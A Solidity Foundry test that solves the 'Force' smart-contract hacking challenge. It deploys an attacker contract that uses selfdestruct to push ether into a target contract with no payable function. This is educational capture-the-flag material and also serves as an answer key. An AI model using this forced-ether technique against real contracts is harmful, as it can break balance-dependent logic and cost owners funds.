/*
* Don't look at the solution without trying yourself first!
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { Force } from "@src/07-Force/Force.sol";

contract AttackerContract {
    Force private immutable force;

    constructor(address _force) payable {
        force = Force(_force);
    }

    function attack() external {
        selfdestruct(payable(address(force)));
    }
}

contract HackForce is Test {
    Force public force;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        force = new Force();
    }

    function testForceEtherIntoForceContract() public {
        // hack the contract
        // your code goes here
        vm.startPrank(attacker);
        vm.deal(attacker, 1 ether);
        AttackerContract attackerContract = new AttackerContract{ value: 1 ether }(address(force));
        // the contract self destructs (well, not actually after the Cancun hard fork) and sends its ether balance to
        // the address passed in, which, in our case, is the `Force` contract
        attackerContract.attack();
        vm.stopPrank();

        assert(address(force).balance > 0);
    }
}
